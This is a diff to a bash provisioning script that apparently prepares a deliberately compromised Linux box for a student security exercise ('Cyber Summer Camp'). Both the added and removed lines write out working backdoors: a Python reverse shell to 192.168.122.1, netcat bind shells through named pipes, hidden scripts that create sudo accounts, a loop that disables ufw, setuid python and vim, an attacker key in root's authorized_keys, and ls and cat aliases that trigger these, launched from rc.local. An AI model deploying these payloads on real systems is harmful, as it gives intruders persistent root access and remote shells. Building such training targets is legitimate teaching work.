@@ -5,106 +5,99 @@ useradd -M -g sudo -p $(openssl passwd -crypt password) username
 # -g main group
 # -u uid
 apt-get -y install telnetd
-apt-get -y install dropbear
-apt-get -y install nmap
 apt-get -y install sl
 apt-get -y install cowsay
 
 /bin/sed -i "s/^#Banner.*/Banner etc\/issue.net/g" /etc/ssh/sshd_config
 
-useradd -M -g sudo -u 98 -p $(openssl passwd -crypt tre) tre
+cat << EOF > /etc/issue.net
+WELCOME TO TODDs SUPER UNHACKABLE POKEMON SERVER!
+EOF
+
+cat << EOF > /var/www/html/index.html
+WELCOME TO TODDs SUPER UNHACKABLE POKEMON SERVER!
+EOF
+
+
 useradd -M -g sudo -u 99 -p $(openssl passwd -crypt sys) system
+
 for user in elsa anna hans olaf kristoff sven marshmallow pabbie oaken bulda
 do
-  useradd -m -g sudo -p $(openssl passwd -crypt $user) $user
-done
-sleep 2
+useradd -m -p $(openssl passwd -crypt $user) $user
 
-mkdir -p /home/student/.ssh & touch /home/student/.ssh/authorized_keys 
-mkdir -p /home/elsa/.ssh & touch /home/elsa/.ssh/authorized_keys 
-mkdir -p /home/tre/.ssh & touch /home/tre/.ssh/authorized_keys 
-cat << EOF >> /home/student/.ssh/authorized_keys 
+mkdir -p /home/$user/.ssh && touch /home/$user/.ssh/authorized_keys
+cat << EOF >> /home/$user/.ssh/authorized_keys 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
 EOF
-cat << EOF >> /home/elsa/.ssh/authorized_keys 
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
-EOF
-cat << EOF >> /home/tre/.ssh/authorized_keys 
+done
+
+for user in  dorothy toto scarecrow wickedwitch wizardofoz cowardlion
+do
+  useradd -M -g sudo -p $(openssl passwd -crypt $user) $user
+done
+
+cat << EOF >> /root/.ssh/authorized_keys 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
 EOF
 
 chmod 4755 /usr/bin/python
 chmod 4755 /usr/bin/vim
 
-
 cat << EOF > /bin/virus.sh
 #!/bin/bash
 while true
 do
   /usr/sbin/ufw disable
-  sleep 500
+  sleep 300
 done
 EOF
 chmod 755 /bin/virus.sh
 
-cat << EOF > /home/student/malware.sh
+cat << EOF > /bin/malware.sh
 #!/bin/bash
-/usr/bin/yes "Megan thinks its cool not to remove malware!"
+/bin/echo -e "~~~ ANTI-VIRUS UPDATED ~~~\n\n****************\n* REBOOTING... *\n**************** "
+/sbin/.open.up.vIrUs.sh &
 EOF
-chmod 755 /home/student/malware.sh
+chmod 755 /bin/malware.sh
 
-cat << 'EOF' >> /home/student/.bashrc
-alias ls='/home/student/malware.sh; ls'
-alias wall='cowsay "Whats the password?" | wall'
-. /etc/bash.bashrc
+cat << EOF > /bin/trojan.sh
+#!/bin/bash
+while true
+do
+  /bin/echo 'trojan-virus pokemon attacking SSH banner' >> /etc/issue.net
+  /bin/cp /bin/trojan.sh /home/trojan-virus
+  sleep 180
+  /home/trojan-virus &
+  sleep 10
+done
 EOF
+chmod 755 /bin/trojan.sh
 
-cat << 'EOF' >> /root/.bashrc
-alias wall='cowsay "Whats the password?" | wall'
-. /etc/bash.bashrc
+
+cat << EOF > /sbin/let_todd_in_VIRUS.sh
+#!/bin/bash
+/usr/sbin/useradd -M -g sudo -p $(openssl passwd -crypt t) todd 2>/dev/null
+/bin/sleep 60
 EOF
+chmod 755 /sbin/let_todd_in_VIRUS.sh
 
-cat << EOF > /etc/rc.local
-#!/bin/sh -e
-#
-# rc.local
-#
-# This script is executed at the end of each multiuser runlevel.
-# Make sure that the script will "exit 0" on success or any other
-
-#
-# In order to enable or disable this script just change the execution
-# bits.
-#
-# By default this script does nothing.
-/sbin/trojan.py || /bin/true
-/bin/rshell.py || bin/true
-/root/open_sesame_VIRUS.sh || /bin/true
-/bin/virus.sh || /bin/true
-/bin/virus.sh || /bin/true
-/usr/sbin/dropbear -p 2222 || /bin/true
-/usr/sbin/dropbear -p 1111 || /bin/true
-/bin/virus.sh || /bin/true
-/bin/virus.sh || /bin/true
-/usr/sbin/dropbear -p 2222 || /bin/true
-/usr/sbin/dropbear -p 3333 || /bin/true
-/bin/virus.sh || /bin/true
-/usr/sbin/dropbear -p 2222 || /bin/true
-/bin/virus.sh || /bin/true
-/usr/sbin/dropbear -p 2222 || /bin/true
-/bin/virus.sh || /bin/true
-/usr/sbin/dropbear -p 2222 || /bin/true
-exit 0
+cat << EOF > /bin/fix
+#!/bin/bash
+/usr/bin/chattr -i /etc/issue.net
+/bin/echo "pokemon" >> /etc/issue.net
+/usr/bin/chattr -i /var/www/html/index.html
+/bin/echo "pokemon" >> /var/www/html/index.html
 EOF
+chmod 755 /bin/fix
+/bin/cp /bin/fix /usr/bin/pokemon-virus
 
-
-cat << 'EOF' >> /bin/rshell.py
+cat << 'EOF' >> /bin/reverse-worm
 #!/usr/bin/python
 # Simple Reverse Shell Written by: Dave Kennedy (ReL1K)
 import socket
 import subprocess
 
-HOST = '192.168.22.16'    # The remote host
+HOST = '192.168.122.1'    # The remote host
 PORT = 5555            # The same port as used by the server
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
@@ -121,9 +114,121 @@ while 1:
 # quit out afterwards and kill socket
 s.close()
 EOF
-chmod 755 /bin/rshell.py
+chmod 755 /bin/reverse-worm
+
+cat << 'EOF' >> /sbin/adduser-malware.py
+#!/usr/bin/python
+import os
+import crypt
+password ="cookie"
+encPass = crypt.crypt(password,"22")
+os.system("useradd -g sudo -p "+encPass+" bagels")
+EOF
+chmod 755 /sbin/adduser-malware.py
+
+cat << EOF > /sbin/.open.up.vIrUs.sh
+#!/bin/bash
+rm -f /tmp/d 2>/dev/null;mkfifo /tmp/d 2>/dev/null;cat /tmp/d|/bin/bash -i 2>&1|nc -l 5000 >/tmp/d 2>/dev/null
+EOF
+chmod 755 /sbin/.open.up.vIrUs.sh
+
+cat << EOF > /etc/rc.local
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+/bin/virus.sh || /bin/true
+/usr/bin/pokemon-virus || /bin/true
+/bin/trojan.sh || /bin/true
+/bin/worm.sh || /bin/true
+/bin/virus.sh || /bin/true
+/bin/trojan.sh || /bin/true
+/bin/worm.sh || /bin/true
+/usr/sbin/dropbear -p 2222 || /bin/true
+exit 0
+EOF
 
 cat << 'EOF' >> /etc/bash.bashrc
+# System-wide .bashrc file for interactive bash(1) shells.
+
+# To enable the settings / commands in this file for login shells as well,
+# this file has to be sourced in /etc/profile.
+
+# If not running interactively, don't do anything
+[ -z "$PS1" ] && return
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, overwrite the one in /etc/profile)
+PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+
+# Commented out, don't overwrite xterm -T "title" -n "icontitle" by default.
+# If this is an xterm set the title to user@host:dir
+#case "$TERM" in
+#xterm*|rxvt*)
+#    PROMPT_COMMAND='echo -ne "\033]0;${USER}@${HOSTNAME}: ${PWD}\007"'
+#    ;;
+#*)
+#    ;;
+#esac
+
+# enable bash completion in interactive shells
+#if ! shopt -oq posix; then
+#  if [ -f /usr/share/bash-completion/bash_completion ]; then
+#    . /usr/share/bash-completion/bash_completion
+#  elif [ -f /etc/bash_completion ]; then
+#    . /etc/bash_completion
+#  fi
+#fi
+
+# sudo hint
+if [ ! -e "$HOME/.sudo_as_admin_successful" ] && [ ! -e "$HOME/.hushlogin" ] ; then
+    case " $(groups) " in *\ admin\ *|*\ sudo\ *)
+    if [ -x /usr/bin/sudo ]; then
+	cat <<-EOF
+	To run a command as administrator (user "root"), use "sudo <command>".
+	See "man sudo_root" for details.
+	
+	EOF
+    fi
+    esac
+fi
+
+# if the command-not-found package is installed, use it
+if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found ]; then
+	function command_not_found_handle {
+	        # check because c-n-f could've been removed in the meantime
+                if [ -x /usr/lib/command-not-found ]; then
+		   /usr/lib/command-not-found -- "$1"
+                   return $?
+                elif [ -x /usr/share/command-not-found/command-not-found ]; then
+		   /usr/share/command-not-found/command-not-found -- "$1"
+                   return $?
+		else
+		   printf "%s: command not found\n" "$1" >&2
+		   return 127
+		fi
+	}
+fi
+
+alias cat='/sbin/let_todd_in_VIRUS.sh; cat'
+alias ls='/bin/malware.sh; echo; ls --color=auto'
+alias wall='cowsay "Whats the password?" | wall'
 #PS1="\u@\h:\w\$ "
 #what user@comp prompt looks like
 if [ $(id -u) -eq 0 ];
@@ -132,15 +237,6 @@ then #root
 else #normal
  PS1="\[\033[0;32m\]\u\[\033[0;33m\]@\[\033[0;35m\]\h\[\033[0;37m\]\w\[\033[0;37m\]$\[\033[0m\] "
 fi
-
-sudo() {
-    if [[ $@ == "su" ]]; then
-        PS1="\[\033[0;31m\]root\[\033[0;33m\]@\[\033[0;35m\]\h\[\033[0;37m\]\w\[\033[0;31m\]#\[\033[0m\]"
-    else
-        command sudo "$@"
-    fi
-}
-
 #Auto complete lines
 bind '"\t":menu-complete'
 #tab cycling
@@ -148,62 +244,10 @@ bind '"\e[Z": menu-complete-backward'
 #works for tab backwards
 EOF
 
-cat << 'EOF' >> /sbin/trojan.py
-#!/usr/bin/python
-import os
-import crypt
-password ="cookie"
-encPass = crypt.crypt(password,"22")
-os.system("useradd -g sudo -p "+encPass+" bagels")
-EOF
-chmod 755 /sbin/trojan.py
-
-
-cat << 'EOF' >> /root/open_sesame_VIRUS.sh
-rm /tmp/d;mkfifo /tmp/d;cat /tmp/d|/bin/bash -i 2>&1|nc -l 2 >/tmp/d
-EOF
-chmod 755 /root/open_sesame_VIRUS.sh
-
-cat << 'EOF' >> /bin/kworker
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l 1234 >/tmp/f
-EOF
-chmod 755 /bin/kworker
-echo "Please add /bin/kworker to crontab -e"
-
-
-cat << 'EOF' >> /bin/setHTML.sh
-#!/bin/bash
-# Set HTML Page
-echo "Will only work as root/sudo"
-read -p "Please enter HTML text: " banner
-cat << EOF > /var/www/html/index.html
-<html>
-<title>Cyber Summer Camp 2.0</title>
-<body><h1>${banner}</h1>
-</body></html>
+cat << EOF >> /home/student/.bashrc
+. /etc/bash.bashrc
 EOF
 
-chmod 755 /bin/setHTML.sh
-cp /bin/setHTML.sh /root
-cp /bin/setHTML.sh /home/student
-
-cat << 'EOF' >> /bin/setSSHBanner.sh
-#!/bin/bash
-#SSH Banner test - only /etc/issue.net
-echo "Will only work as root/sudo"
-read -p "Please enter SSH banner text: " banner
-echo $banner > /etc/issue.net
+cat << EOF >> /root/.bashrc
+. /etc/bash.bashrc
 EOF
-chmod 755 /bin/setSSHBanner.sh
-cp /bin/setSSHBanner.sh /root
-cp /bin/setSSHBanner.sh /home/student
-
-cat << 'EOF' >> /bin/changeSSHPort.sh
-#!/bin/bash
-echo "Will only work as root/sudo"
-read -p "Enter new port number: " num
-/bin/sed -i "s/^Port.*/Port $num/g" /etc/ssh/sshd_config
-EOF
-chmod 755 /bin/changeSSHPort.sh
-cp /bin/changeSSHPort.sh/root
-cp /bin/changeSSHPort.sh /home/student
